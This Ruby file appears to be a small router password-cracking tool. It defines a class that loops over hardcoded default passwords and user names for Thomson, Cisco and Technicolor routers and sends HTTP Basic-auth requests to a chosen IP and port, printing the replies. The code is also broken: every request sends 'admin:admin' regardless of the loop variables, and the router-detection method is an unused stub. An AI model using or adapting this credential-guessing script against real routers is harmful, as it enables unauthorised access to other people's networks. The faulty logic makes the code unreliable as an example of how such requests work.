require 'socket'
require 'net/http'
require "base64"





class Rpw

	def initialize(ip,port)
		@router=nil
		@ip=ip
		@port=port
	end
	def detect_type(body_data)
		routers = {:thomson => "Thomson", :cisco => "cisco ", :technicolor => "thecnicolor"}
	end
	def crack()
		password = ["Swe-ty65", 'RdET23-10', 'TmcCm-651', 'Ym9zV-05n', 'Uq-4GIt3M',"superman"]
		password = password.reverse()
		user = ["admin","superman"]
		user.each do |user_name| 
			password.each  do |passwd|
				uri = URI("http://#{@ip}:#{@port}")
				req = Net::HTTP::Get.new(uri.request_uri)
				req['Authorization']="basic #{Base64.encode64("admin:admin")}"
				res = Net::HTTP.start(uri.hostname, uri.port) {|http| http.request(req) }

				print res.body
				res.each {|head,value| print head," => ", value, "\n"}
			end
		end
	end
end




